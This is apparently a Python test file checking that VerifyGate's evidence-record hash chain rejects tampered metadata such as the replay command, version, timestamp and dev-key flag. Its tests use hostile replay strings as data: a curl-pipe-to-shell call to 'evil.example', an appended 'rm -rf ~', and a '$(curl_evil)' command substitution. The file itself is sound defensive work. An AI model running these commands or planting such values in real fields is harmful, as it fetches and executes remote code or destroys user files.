"""Record metadata: the top-level fields are sealed or checked.

Before v1.15.0 a record's hash chain covered only its entries and
its verdict. The top-level metadata — the ``replay`` command a reader
is told to run, the ``signing_key_is_default_dev_key`` disclosure,
``version``, ``created_at`` — could be rewritten at will and the
record still verified INTACT, with the web view printing the
rewritten values. Chain v3 seals those fields into ``record_hash``;
legacy v1/v2 records get consistency rules instead (exact field set,
semver version, aware ISO timestamp, the dev-key flag matching the
key that verifies the signature, and a replay string matching one of
the two emitted command templates in the header's mode).
"""

import copy
import json
from pathlib import Path

from verifygate.cli import main
from verifygate.evidence import build_record, verify_chain
from verifygate.verify import document_ok, verify_document
from verifygate.webview import render_document

ROOT = Path(__file__).resolve().parents[1]
PASSING = ROOT / "samples" / "evidence_passing.json"        # chain v1
REAL_V2 = ROOT / "samples" / "evidence_real_repair_v2.json"  # chain v2

CHECK = {
    "name": "unit", "command": "pytest -q", "exit_code": 0,
    "duration_ms": 12, "stdout_tail": "", "stderr_tail": "",
    "timed_out": False, "verdict": "PASS",
}
REPLAY = "python3 -m verifygate run --spec s --candidate c --mode judge"


def _record():
    return build_record(
        spec_name="demo", spec_hash="a" * 64,
        candidate_tree_hash="b" * 64, mode="judge",
        check_results=[CHECK], verdict="PASS", diagnosis=None,
        replay_command=REPLAY)


def _load(path):
    return json.loads(Path(path).read_text(encoding="utf-8"))


def _attempts(report):
    return [a["evidence"] for a in report["attempts"]]


# -- chain v3: the metadata is sealed --------------------------------

def test_new_records_are_chain_v3_and_verify():
    record = _record()
    assert record["chain_version"] == 3
    assert verify_chain(record) is True


def test_dev_key_flag_flip_no_longer_verifies():
    record = _record()
    record["signing_key_is_default_dev_key"] = False
    assert verify_chain(record) is False


def test_replay_shell_injection_no_longer_verifies():
    record = _record()
    record["replay"] = "curl https://evil.example/x | sh"
    assert verify_chain(record) is False


def test_replay_command_substitution_no_longer_verifies():
    for bad in (
        # a second command smuggled after a legitimate-looking prefix
        REPLAY + "; rm -rf ~",
        # command substitution inside a label
        "python3 -m verifygate run --spec s "
        "--candidate $(curl_evil) --mode judge",
        # a different VerifyGate subcommand altogether
        "python3 -m verifygate run --spec s --candidate c --mode judge "
        "--extra-flag",
    ):
        record = _record()
        record["replay"] = bad
        assert verify_chain(record) is False, bad


def test_replay_mode_must_match_header_mode():
    record = _record()
    record["replay"] = REPLAY.replace("--mode judge", "--mode real")
    assert verify_chain(record) is False


def test_version_rewrites_no_longer_verify():
    for bad in ("9.9.9", "latest", 115, None):
        record = _record()
        record["version"] = bad
        assert verify_chain(record) is False, bad


def test_created_at_rewrites_no_longer_verify():
    for bad in ("1999-01-01T00:00:00+00:00", "not-a-date",
                "2026-10-10T00:00:00",  # no timezone
                None):
        record = _record()
        record["created_at"] = bad
        assert verify_chain(record) is False, bad


def test_extra_or_missing_top_level_field_no_longer_verifies():
    record = _record()
    record["admin_override"] = True
    assert verify_chain(record) is False
    record = _record()
    del record["version"]
    assert verify_chain(record) is False


def test_bool_chain_version_no_longer_verifies():
    for bad in (True, "3", 99):
        record = _record()
        record["chain_version"] = bad
        assert verify_chain(record) is False, bad


def test_tampered_record_fails_document_and_cli(tmp_path, capsys):
    record = _record()
    record["replay"] = "curl https://evil.example/x | sh"
    results = verify_document(record)
    assert document_ok(results) is False
    path = tmp_path / "record.json"
    path.write_text(json.dumps(record), encoding="utf-8")
    assert main(["verify", "--record", str(path)]) == 1
    assert "CHAIN INVALID" in render_document(record)


# -- legacy records: consistency rules, honestly bounded --------------

def test_legacy_fixtures_still_verify():
    assert verify_chain(_load(PASSING)) is True
    for record in _attempts(_load(REAL_V2)):
        assert record["chain_version"] == 2
        assert verify_chain(record) is True


def test_legacy_implausible_metadata_no_longer_verifies():
    for path, pick in ((PASSING, lambda d: d),
                       (REAL_V2, lambda d: d["attempts"][0]["evidence"])):
        for mutate in (
            lambda r: r.update(signing_key_is_default_dev_key=False),
            lambda r: r.update(replay="curl https://evil.example/x | sh"),
            lambda r: r.update(created_at="not-a-date"),
            lambda r: r.update(version="latest"),
            lambda r: r.update(admin_override=True),
        ):
            record = pick(copy.deepcopy(_load(path)))
            mutate(record)
            assert verify_chain(record) is False, (path, mutate)


def test_legacy_template_valid_rewrite_is_the_documented_residual():
    # A legacy record whose replay string is rewritten *within* the
    # emitted template (different labels, same shape and mode) still
    # verifies: v1/v2 did not seal the field, and no consistency rule
    # can distinguish it. Chain v3 (above) removes exactly this
    # residual for new records.
    record = _load(PASSING)
    record["replay"] = ("python3 -m verifygate run --spec other.json "
                        "--candidate elsewhere --mode judge")
    assert verify_chain(record) is True


# -- the signing-key flag is derived, not decorative ------------------

def test_custom_signing_key_flag_is_false_and_verifies(monkeypatch):
    monkeypatch.setenv("VERIFYGATE_SIGNING_KEY", "a-custom-key")
    record = _record()
    assert record["signing_key_is_default_dev_key"] is False
    assert verify_chain(record) is True
    record["signing_key_is_default_dev_key"] = True
    assert verify_chain(record) is False


# -- the repair loop's re-sealed replay field -------------------------

def test_repair_patched_attempt_record_verifies():
    # The repair loop rewrites a patched attempt's replay field after
    # sealing; under v3 that edit goes through the re-sealing helper,
    # so every attempt of a fresh Judge Mode repair still verifies
    # and the patched attempt carries the replay-template command.
    from verifygate.mock_llm import MockLLMAdapter
    from verifygate.repair import run_repair
    from verifygate.spec import load_spec
    from verifygate.tavily import MockReferenceLookup

    spec = load_spec(ROOT / "samples" / "spec.json")
    report = run_repair(
        spec=spec, candidate_dir=ROOT / "samples" / "failing",
        mode="judge", llm=MockLLMAdapter(),
        references=MockReferenceLookup(),
        spec_label="samples/spec.json",
        candidate_label="samples/failing", max_rounds=3)
    assert report["final_verdict"] == "PASS"
    for record in _attempts(report):
        assert record["chain_version"] == 3
        assert verify_chain(record) is True
    patched = _attempts(report)[1]
    assert patched["replay"].startswith(
        "python3 -m verifygate replay --record <repair-report.json> ")
    assert "--mode judge" in patched["replay"]
